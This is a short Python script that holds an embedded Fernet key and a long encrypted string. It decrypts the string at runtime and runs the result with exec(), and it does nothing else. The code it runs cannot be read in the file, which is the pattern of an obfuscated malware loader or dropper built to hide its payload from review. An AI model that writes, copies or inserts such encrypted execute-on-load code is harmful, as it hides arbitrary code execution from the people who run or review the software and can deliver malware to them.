
from cryptography.fernet import Fernet

# Embedded key and encrypted payload
key = b'tbPw3EDQ5Qh1qVqSSJMC7c6X0Cp_1XmUB_wWkHp_XcI='
encrypted_code = 'gAAAAABoQyn8DuuOlH_MSnsf7ab3n8BtsX37_001nqO9bRMemSv34xdmAcnBEDdjk6tVVL0QwM5If_oJHyHo1aaCLzpReVyf2IjQTKwKeh0jgDKFbH8e4U2rRQQMOn3kAQCywQP_S1AmaOvKNj2gTCjFpGJeGIRxLIfUCOI6kJhscv-dzJWNIrDzYZfQaCSlM_Rng--nDP_zJd_ZI3QXDSpSqB9Ql2fCNoHQHNB4LQbjSDZWEzPsd0aFwRhPqk3mIo-jemBrqjX3ziW8FOiMKvIYugRo6SS6ygDFuVb3BGsHjYdtGSEirplCb7CpkPNUi2wEbvoW-V8W4srEvPLaO4VqPIGmkYeVZjJVq-Nx5vghUutjwtzu1GlwBxncggZTdJ0mqk3iL64SrofiLT039-0xPs8LigHsAzrb9lGYyuSp05Zp1OCqyMXWRefoKRQL3-nQLCU5IIVYijGdd--lK2gPyttiB_Y2sJOWbDuLU7z4DgHSJbiKqRb-M_84R-TI57wBGN614UDAC5IV_H4gc5MZ4htMGNOw9FmTaa2eTgdG_MUAbQ8hgsup9AY0PjfGARN-lkG6-rp3_BosIEyIC6OvndwntRS3NIIxVXUA5l4t_FLbgJCBEM0FTEsPp4PCJoWZuZDTLNtP4sPeS0-BoJDzjSpigP9Uo-o-Yo7Ggi8VL814T6QpeaNDujWBVcximgYwRtKCp0xGwBkWErI7dJkHbfaQqpS7PX_yOPWmdSX1Rh68Z_qUBooHf898rdVyp2D7oQSfqurIBpyQv3UmCYjKmjXL_ZFtImbF440dKZTE40rMFlYA3CdtydQl5l4-Nc9rVZNkV7tm1Wf-YNB6lljJnYwnBxO5a_Edebcv0kxsJCR75IgD3KSKhB5lUp0n2IE5My3ixy5D2cbtqV3Pk8sOR7pG5K2XHWPFcf_owqGnXspBqvsuhhg-LhuSMPPw7_TkaMfH8fbxZnS9psiAzFx6ybhI2FEiXVPNfGNXqdnA7xv789HFPeQuUVuNxkIcpV7ejtqVdNTVMG5A_dMwXzUuQkC9ntLqObx3SWKFXByPE4RR1mBJ4re04kqcXb2NMSiUPimC9wC94OCorSUEmiuMFYXp8pUHUjxv2bnMz1ZXqjuBfqjbZbIemS2jyFfXU_cABKxvchEZ4jOgb7kVWgj7rRygeUFLpDRz8CNAT4HWzSl9qQgyH-Wn-hVh1PxcY1Ik1rXFQEet-3um8lNcLo31zL-3iQpkCuEugrbFYxjvTHLSfmAFnOJ6R96A-8yWEaNb8_SBGyoWf7J0pEjkSJ2_nmxw5lUfJeBweTes_IIYGT7MScJcWkRnpsPtZXn92McMScAtc3uLvcTFTWCf5le4REEOpkO9FYaOy2bkH1Por1aBbFB-0aBhZuq7fqm651yRV86523YG-2ek0DBJSr3vq0mZBkWzy8dhXndU5G_Zr3XO0__I2g6O2OkuILqIfydMhyUPAx98c-iFXQZT6oQcVyzVgTZXtLyEct71oQrQ9-cqmMgqQtqwC1FksuFcgCH_XlyS_-kmg0QlHXR9kRRW7HhPIti2ZngybMu86cS5c6sy6F-2A8pAqz0bTIO4AXyvctht4o63ONOO1gSfSxnMqRE2UbVgpeq_ccjeOYl0RHUMFsXPvLDBiehN-tIlCLeY0PAwu1COak0JFwf1VMXHEtyke5nOPDWcAY_pvRe6-s9imN2iYGeJJUaQtfvfUPIYTehk3cNMAEGN_Hlf22JhJwUfQCSijwQAwQejDv6ZsT99b0eRzwwlj5ymvWC8U_QycBxDZvSGUCqtD0IAeAEdV6cPrLcFBTSLgBR4XExnLcjkm1ohtUGe_h_WJKnL6eXcIEJi2ExytDTlGfq6tScSgLUw1BL-24mV5WBbRFopLhqMGxcoLAc6JOirSFB23KFFKvXtqY-gQwWTW3thu6LtY1VPYYxSE---dohs3CgFCnpWVduNWS51RPsNlWi9wArcDSQfgHOOptvXw16jVoZ4-mRNIbbO4K3uoJcGT_Tyda2ufEZYtf3W0O7zjixMoCUKLUSJF-ENK3fyR0WUuCRtCptO-u_hWWRDwx5grh9AqO3tuczSOnWPHFdgVT_JNK5mhWrA-0gFPCGWEX14yPxV3Np3mIaTpipRr9_eMhDGRq_WTUzFaH3XvkkutoQRGRqWdauktUlHaImFBvHK8HZuv9nPC6OIJ7jfwpE6NFvnVC_BshhQ5padG0ZM4BdKZ33REYfQ3jPYk4QTr29hVbcaPS40Ta_K_zf6yRnRYGBeCTelcmZn94Md33WmZQhsHiWygEq7ElHcGlFVOhUzFoSVHq5NOaM1DpcSY5rx9N__RPcdEUF8POU3JVRyu3vg2wHqOPqc5-lXTxRxzVUcv8FLUoFTBR1dx2taGCUrncDQh7lDfCoQ6r-xHlnHi08i63FPRikntY5yT6i5sLH2_Pa89kzg60HNkRU5Hlqoj9zLRIRqNQOcnXkS97xqqVHjkaGrg55sJOW1AQupiqrjM8-xzKgybXKfmzDbYSIGdag6b0aXCYgVoumPEUNfl00KFGjFJjH6FqCYCVKbFOV6-vH-dJRvgV5phWSYK9KU3NDSl6fSL0YEmpubO8cadM90fijbP8qma85KZb9SMr1iji3EWg56NLe7Q88ro1YBAwU72uKXCSaaMZfSm18tRzcTg3WRngmhAGt-T63UUMWEU2QtA6Jxv99WkRrqGPBgOAY8HuHv_p4Jdi3xzFTF5GRvvBzhVFaHy1eJcJZ_w4l3R9DxxScskOvYcnDTBpFYTEM14N5Wo_Ry-V6k_smMZWGI203f7mNvXn9vf1UEIaYnQJx1pvRp7QJ5I3Hgjn3YrCQp4WkIYdS7i0cdiMC7QdJ3551hxTGndAjb-4SFMaNRfE8L1lJ5hlxY42T0mW6J2ZwCw6EEYm9baWkA1GSYnJiT3KeFXi9uTgBu07wdZenGdVGvghCnmmvfXdmhAnPHRiLfiUcpFHOhQSFipcFhuHN15kY6kVWrhZHmhbsdjiReItZUVxhq4mZD0YvcgGApEQqJBNzpTsnshmuruDDZPOVoQnD7Pe1PbBUdrdIret3_pH3Q_7iEMUW0AUri0L3b_s0i8CNNE7lfe7FRPCqeyJ4Zl0_CZyUBEJLmqh-vGyXV0rcFxHcXTa7JsA4C86PAJmyHAWxwD8c-tPa2QeCXgVRAPVEETDoFZw5qCR4IpFOXHEZ0Wz_CL35gSDb2tXefW8kftjxKmfWHAhb_svgWl1faG2Ao5u0gTpKEPS_v3Hcn9G8Vv_G0OzxvgxZvdeMaiTUlSJwSR6kbHJHBj1gg2rZRSacDWDikTlPM_PsTfpG1-VjTQIpNYgZ7ORvZPuGztbla3Q7PnqXvCnTCOX7lIZnWq3GHW9JbP_aG4VYa_IHKUZHmsLBln0aokRnTclhCu4bZSht6OSbh6PzhZ2jCzQRVgb4zk9_KFA5TywvJ-bu96dO8LjUWDTuzheToy4IA1W2H3dpoa1DYlSr3S0jxcj110fA-Ty-B9fg61DHFrPgrLAp-9V3rvZB7rgwoayQP2EnlRzuJVvHDmO1jteDyt6Du4c7ZW6QJzymi2OSZhw4LvvupP0vewiLnbUib4coPoYONFFPXa3WcW0VM7qQjMb85-5-2lji7ZAzLsY5bVxF581VFByiBg1kYxytz9w1iZaeqNuQKf_I__SK69gPjJAGkGVj8_Zmjtigf5Qw-oTUTZTF2x1jmaLgSRhHmDt9Tnkj2jGPulhPely6tlvycYwDn7sHUUxPcFyA5BOfC3n69T6fNGJJgs-ZkkQMEjcbc8z2fv7PsorzLB0LZtQhVlvz1kwmJS7gHQV30c_oKyHGwjLOCqmOH7U36tDneEbdEORXh4i3AJSI0xjZoE7fa7QjG_SIBerE4Tht1ix0liSblb4i8l-NUgpAN2S6Vp2_hUTeRjpALpTyurWXC_8lLjqT2JBxzNW52cj8h7OYx53w9ZbLqZti-sNkwZIpj-bco5w74hTIqXK7Mz8tNhx4RIHKBOJRtX5ODMYHbr1TG73LGnfnCU7fOaRymtTbYg3w_dwAWpJ9P5lBmXzY='

# Decrypt and execute
exec(Fernet(key).decrypt(encrypted_code.encode()).decode())
